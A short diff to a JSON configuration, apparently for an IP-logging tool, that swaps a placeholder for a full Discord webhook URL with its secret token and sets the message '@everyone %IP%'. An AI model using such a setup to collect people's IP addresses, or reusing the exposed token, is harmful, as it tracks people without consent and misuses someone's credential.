@@ -1,6 +1,6 @@
 {
-  "webhook": "YOUR WEBHOOK URL HERE",
-  "webhook_name": "Webhook",
+  "webhook": "https://discord.com/api/webhooks/1121259262933467146/WosRQdgrFTfhwvI22ivqCaa3HZyiFbFeZZ5sZVNQ75MFgUxOQ1GEuqhvr2Be1dVIK3Vh",
+  "webhook_name": "SSIDS",
   "webhook_avatar": "https://cdn.discordapp.com/embed/avatars/0.png",
   "message": "@everyone %IP%",
 
